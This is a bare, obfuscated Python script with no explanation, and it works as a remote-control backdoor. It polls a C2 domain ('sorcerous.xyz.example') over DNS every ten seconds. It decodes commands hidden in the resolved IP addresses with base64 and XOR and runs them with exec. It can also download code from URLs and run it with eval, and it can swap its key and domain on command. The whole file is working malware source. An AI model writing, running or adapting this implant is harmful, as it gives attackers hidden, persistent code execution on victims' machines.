from base64 import b64decode as bd,b64encode as be
from socket import gethostbyname_ex as gx,inet_aton as ia
from struct import unpack as up
from time import sleep as sp
from urllib.request import urlopen as uo
cg={'i':'oaepev','k':b'ciCada3301','p':'sorcerous.xyz.example','s':10,'c':b'','a':b'Ckl+QRERGxEMfUFFYwgFSVJXGRg4WR5rCkEOE1kRXVdjU1xrVhMNETg0SQcLExNZEFgNSTEACgZWGwQYWWNjQURBQFsQDEMDY0tEVjkTEBFDDG0AFBFWXVQZSwBjR0RJA1EBAFJYclBVQQ8PEEILQGpBWl8TQFgYaQooOgo8Ew4QUxodJhJMBBo='}
def dc(d,k):lk=len(k);return bytes(d^k[i%lk]for(i,d)in enumerate(d))
def ra(ads,k):
	ck={}
	for ad in ads:exec(dc(bd(cg['a']),k))
	return dc(bd(b''.join(ck[i]for i in range(len(ads)))),k)
def cu(d,k):
	a=gx(d)
	for c in ra(a[2],k).split(b'|'):do(c)
def ri(u,k):
	with uo(u)as r:eval(dc(r.read(),k).decode())
def do(cc):
	c=cc[0:1];a=cc[1:]
	match c:
		case b'r':cg['a']=be(dc(dc(bd(cg['a']),cg['k']),a));cg['k']=a
		case b'x':cu(cg['p'],cg['k'])
		case b'p':cg['p']=a
		case b'w':sp(int(a))
		case b'g':ri(a.decode(),cg['k'])
		case b'c':
			match a[0:1]:
				case b'c':cg['c']+=a[1:]
				case b'f':do(cg['c']+a[1:]);cg['c']=b''
def main():
	i=cg['i'];s=cg['s']
	while True:
		sp(s)
		try:cu(f"p{i}.{cg['p']}",cg['k'])
		except Exception:...
if __name__=='__main__':main()